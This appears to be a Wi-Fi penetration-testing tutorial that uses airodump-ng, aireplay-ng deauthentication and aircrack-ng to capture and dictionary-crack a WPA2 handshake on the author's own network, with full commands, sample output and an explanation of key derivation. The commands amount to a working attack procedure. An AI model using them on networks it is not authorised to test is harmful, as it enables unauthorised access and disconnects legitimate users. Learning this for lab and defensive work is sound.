
# 🔐 WPA2 Handshake Capture & Crack Guide

A step-by-step walkthrough for capturing and cracking WPA2 Wi-Fi handshakes using Kali Linux tools such as `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, and `Wireshark`. This guide includes real command examples, output samples, and clear syntax explanations to help you learn practical Wi-Fi penetration testing.
  
---
  
 
## 🔰 STEP 1: Show your current Wi-Fi interfaces
     
```bash
ip a 
```
Output:
```bash
    
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:d1:f8:5d brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 83641sec preferred_lft 83641sec
    inet6 fd17:625c:f037:2:f3f0:9569:d80d:1f3c/64 scope global dynamic noprefixroute 
       valid_lft 83641sec preferred_lft 11641sec
    inet6 fe80::5cd6:6f08:b2c1:8819/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
10: wlan0mon: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 00:2e:2d:e0:14:60 brd ff:ff:ff:ff:ff:ff

```

 
 
## 🛑 STEP 2: Stop Monitor Mode (to start fresh)
```bash
sudo airmon-ng stop wlan0mon
```
It will prompt for a password. Type kali if using Kali Linux.

 
Output:
```bash
PHY     Interface       Driver          Chipset

phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 802.11b/g/n 1T1R 2.4G WLAN Adapter
                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
```



## 🚀 STEP 3: Start Monitor Mode
```bash
sudo airmon-ng start wlan0
```
It will prompt for password. Type kali if using Kali Linux.

Output:
```bash
PHY     Interface       Driver          Chipset

phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 802.11b/g/n 1T1R 2.4G WLAN Adapter
                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
```



## 📡 STEP 4: Scan for Nearby Wi-Fi Networks
```bash
sudo airodump-ng wlan0mon
```
Let it run for 10–15 seconds, then press Ctrl + C.
Take note of:
```bash
BSSID (MAC) of your target network (e.g., Ankith)

Channel (CH)

ESSID (name)
```
Example:

```bash
3E:B7:E4:DD:3A:19  -40      122        0    0  11  180   WPA2 CCMP   PSK  Ankith
🧾 Syntax Explanation:
BSSID → This is the MAC address of the Wi-Fi router: 3E:B7:E4:DD:3A:19

CH (Channel) → The Wi-Fi channel number it's broadcasting on: 11

ESSID → The name of the network: Ankith
```

## 🎯 STEP 5: Lock onto the target and capture the handshake
```bash
sudo airodump-ng -c 11 --bssid 3E:B7:E4:DD:3A:19 -w ankith_capture wlan0mon
```
This locks onto channel 11, focuses on Ankith, and saves handshake to ankith_capture-01.cap.
Keep running until you see:
```bash
WPA handshake: 3E:B7:E4:DD:3A:19
```

## 💥 Trigger the Handshake (Deauth Attack)

If no client is connecting or the handshake is taking too long, we can force a device to reconnect by sending deauthentication packets.
```bash
sudo aireplay-ng -0 5 -a 3E:B7:E4:DD:3A:19 wlan0mon
```

Explanation:
```bash
-0 → Deauth attack mode

5 → Number of deauth packets

-a → Target BSSID (router)

wlan0mon → Monitor mode interface
```

This sends 5 deauthentication frames to all clients connected to Ankith.
Those clients will disconnect and auto-reconnect, triggering a WPA handshake.

## 📱 Simple Trick

Take your phone near the laptop or PC, turn Wi-Fi off, then turn it on again.
When the respective Wi-Fi appears on the phone, click on it.
WPA handshake: 3E:B7:E4:DD:3A:19 will appear on your terminal.

📋 Sample Output
```bash
CH 11 ][ Elapsed: 6 mins ][ 2025-07-05 03:40 ][ WPA handshake: 3E:B7:E4:DD:3A:19

BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
3E:B7:E4:DD:3A:19  -44  90     2795      418    0  11  180   WPA2 CCMP   PSK  Ankith

BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
3E:B7:E4:DD:3A:19  50:8F:4C:A9:E0:6D  -45    1e- 1   16721    10638  EAPOL  Ankith

```

## 🧾 STEP 7: Open and Visualize the Handshake in Wireshark
```bash
wireshark ankith_capture-01.cap
```

In Wireshark, apply this display filter:
```bash
eapol
```
You should see up to 4 packets:

Message 1 of 4

Message 2 of 4

Message 3 of 4

Message 4 of 4

Navigate to: IEEE 802.1X Authentication → Key Information

Example Key Info Flags:
```bash
KeyDescriPtor Versxon
Key Type: Pairwise Key
Key Index: @
Install: Set	[IMP]
Key ACK: set	[IMP]
Key MIC: set	[IMP]
Secure: Set
Error: Not set
Request: Not set
Encrypted Key Data: Set
SMK Message: Not set
```

🔢 Message Mapping Table:
Message	Flags
```bash
1	Key ACK = 1, Key MIC = 0, Install = 0
2	Key MIC = 1, ACK = 0, Install = 0
3	MIC = 1, ACK = 1, Install = 1
4	MIC = 1, ACK = 0, Install = 0 (again)
```

💡 You only need Message 2 to crack with Aircrack-ng.

## 🔓 STEP 9: Crack the Handshake
You’ll need a wordlist (dictionary of possible passwords).
In this case, Since it was my own Wifi, I suspected a few potential passwords and created a file including those.

📌 Create a Wordlist
```bash
echo -e "anki123456\nankith1234\nankith@2024\nAnkith123\nankithwifi\nankith321\nankith" > ankith_list.txt
```
🔨 Crack Command
```bash
aircrack-ng -w ankith_list.txt -b 3E:B7:E4:DD:3A:19 ankith_capture-04.cap
```
🧾 Sample Output
```bash
Reading packets, please wait...
Opening ankith_capture-04.cap
Read 16951 packets.

1 potential targets

                               Aircrack-ng 1.7 

      [00:00:00] 7/7 keys tested (72.14 k/s) 

      Time left: --

                          KEY FOUND! [ anki123456 ]

Master Key     : 8D 99 0F 60 C7 01 2A 8B 41 1B 4A 4E 55 C4 8A 14 
                 25 52 A5 F1 DF 21 20 EA 4A 0C E9 52 3E 54 DB C4 

Transient Key  : E9 53 84 18 E3 D9 3B 7E 54 F7 81 5E EE 28 87 75 
                 5D 9C 5C F2 10 4C FA 5B 5A FE F3 D5 AF A9 D2 32 
                 63 DB 59 04 EA F8 79 BE DA 5A BE E6 3B 49 BD AB 
                 3D 02 68 3A CF 12 46 83 EA A8 2B 4C 57 43 8A DB 

EAPOL HMAC     : 81 C3 AD 1B 94 D1 CE C7 F6 6F 11 07 F1 0B CF 6D
```


✅ The suspected passwords list helped crack the key successfully.


If you are smart enough, you'll understand why I created my own list and hardcoded the passwords into it before running aircrack-ng.

If you understood till here, then further on you can refer the below tools to proceed 

### 🔐 cewl 

### 🔐 crunch 

### 🔐 John the Ripper 

Or 

Alertnatively:

### 📁 rockyou.txt

### 📚 SecLists GitHub repo

### 🔐 hashes.org 


## 🧬 What Really Happens When You Enter a Wi-Fi Password?

When you connect to a WPA2 Wi-Fi network, your password is never sent over the air. Instead, it is used to generate cryptographic keys, which are then used to authenticate and encrypt communication.

### 🔐 Key Derivation Process (Simplified)

Here’s what happens:

You enter the Wi-Fi password (Pre-Shared Key, or PSK)

This PSK is combined with the SSID and processed using PBKDF2 (a key derivation function) to generate the Pairwise Master Key (PMK)

```bash
PMK = PBKDF2(SSID, PSK)
```
During the 4-way handshake, the PMK is used along with random values (nonces and MAC addresses) to derive the Pairwise Transient Key (PTK)

PTK is a combination of 3 things:

PMK (from password)

Nonces (from router and client)

MAC addresses (router + device)

The PTK is split into keys including:

🔑 KCK – Key Confirmation Key

🧪 KEK – Key Encryption Key

🔐 TK – Temporal Key (for data encryption)

📎 MIC Key – Used to generate the Message Integrity Code (MIC) in handshake packets   (Weakest link where we try to get in)

### 🧠 So How Does Cracking Work?

When we capture the WPA2 handshake, we don’t get the password — but we do get the handshake packets containing the MIC.

Cracking tools like aircrack-ng do the following:

Take each password from your wordlist

Derive the PMK → PTK → MIC using the captured SSID and handshake values

Compare the generated MIC with the one from the captured handshake

If it matches ✅ — the password is found!
 
